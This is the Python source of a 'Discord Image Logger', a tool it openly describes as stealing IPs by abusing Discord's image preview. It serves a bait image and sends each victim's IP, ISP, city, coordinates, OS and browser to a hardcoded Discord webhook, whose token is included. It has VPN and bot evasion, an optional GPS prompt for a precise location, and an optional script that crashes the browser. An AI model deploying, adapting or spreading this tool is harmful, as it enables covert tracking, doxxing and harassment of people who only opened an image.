# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1250101603453632653/WWCPIUr4kZz7B_pE_DQKcWobo6CtjPJg1vd0g_Tw5UD0SxdUOJSjdbZv-G-ksuCMCXmE",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "discord.com" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = app = ImageLoggerAPI
